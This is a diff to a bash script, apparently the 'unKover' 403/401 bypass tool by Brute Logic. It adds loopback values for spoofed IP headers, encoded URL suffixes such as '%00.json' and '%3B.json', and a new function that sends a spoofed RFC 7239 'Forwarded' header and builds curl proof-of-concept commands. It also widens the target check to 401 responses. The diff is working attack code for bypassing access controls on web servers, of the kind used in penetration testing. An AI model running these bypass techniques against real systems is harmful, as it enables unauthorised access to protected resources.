@@ -9,7 +9,7 @@
 # CONFIG
 # ---------------------------------------------------------------------------
 
-TOOL="unkover v1.2 by Brute Logic - https://brutelogic.net"
+TOOL="unKover v1.3 by Brute Logic - https://brutelogic.net"
 JSON_MODE=false
 QUIET_MODE=false
 CONNECT_TIMEOUT=3
@@ -57,12 +57,13 @@ IP_HEADERS=(
     "CF-Connecting-IP"
 )
 
+# Shared loopback / internal notations, ordered for fast exit
 IP_VALUES=(
     "127.0.0.1"
+    "0.0.0.0"
     "127.1.1.1"
+    "::1"
     "192.168.1.1"
-    "10.0.0.1"
-    "172.16.0.1"
 )
 
 # Ordered by PoC relevance — POST/PUT before OPTIONS/HEAD
@@ -104,10 +105,12 @@ HOP_BY_HOP_HEADERS=(
 
 SUFFIXES=(
     "/"
-    "/.json"
-    "%20"
-    ".css"
     ";x"
+    "%20"
+    "%3B.json"
+    "%23.json"
+    "%3F.json"
+    "%00.json"
 )
 
 # Ordered low-noise → high-noise
@@ -337,6 +340,25 @@ test_ip_headers() {
                 add_finding "ip_header_spoof" "$req_json" "$s" "$z" "$poc"
             fi
         done
+    done
+}
+
+test_forwarded_header() {
+    local url="$1"
+    [[ $DONE -eq 1 ]] && return
+    for ip in "${IP_VALUES[@]}"; do
+        [[ $DONE -eq 1 ]] && return
+        # RFC 7239: IPv6 literals must be bracketed and quoted; "For" beats case-sensitive filters
+        local val; [[ "$ip" == *:* ]] && val="For=\"[${ip}]\"" || val="For=${ip}"
+        local res; res=$(req "$url" -H "Forwarded: ${val}")
+        local s; s=$(status_of "$res")
+        local z; z=$(size_of "$res")
+        if is_bypass "$s"; then
+            local req_json
+            req_json=$(printf '{"header":"Forwarded","value":"%s"}' "$(json_str "$val")")
+            local poc="curl -i -H 'Forwarded: ${val}' '$(json_str "$url")'"
+            add_finding "forwarded_header" "$req_json" "$s" "$z" "$poc"
+        fi
     done
 }
 
@@ -589,16 +611,16 @@ main() {
     START_TIME=$SECONDS
     $JSON_MODE || header
 
-    # Preflight — confirm target returns 403
+    # Preflight — confirm target returns 401 or 403
     local baseline; baseline=$(req "$URL")
     local baseline_status; baseline_status=$(status_of "$baseline")
     local baseline_size; baseline_size=$(size_of "$baseline")
 
-    if [[ "$baseline_status" != "403" ]]; then
+    if [[ "$baseline_status" != "403" && "$baseline_status" != "401" ]]; then
         if $JSON_MODE; then
-            printf '{"error":"target returned %s, expected 403"}\n' "$baseline_status"
+            printf '{"error":"target returned %s, expected 401 or 403"}\n' "$baseline_status"
         else
-            printf 'Target returned %s, expected 403.\n' "$baseline_status"
+            printf 'Target returned %s, expected 401 or 403.\n' "$baseline_status"
         fi
         exit 1
     fi
@@ -608,7 +630,7 @@ main() {
 
     # Run techniques — most specific/reliable first, stop at first bypass
     run_test "ip_header_spoof"     test_ip_headers       "$URL"
-    run_test "method_tampering"    test_method_tampering  "$URL"
+    run_test "forwarded_header"    test_forwarded_header  "$URL"
     run_test "method_case"         test_method_case       "$URL"
     run_test "protocol_header"     test_protocol_header   "$URL"
     run_test "referer"             test_referer           "$URL"
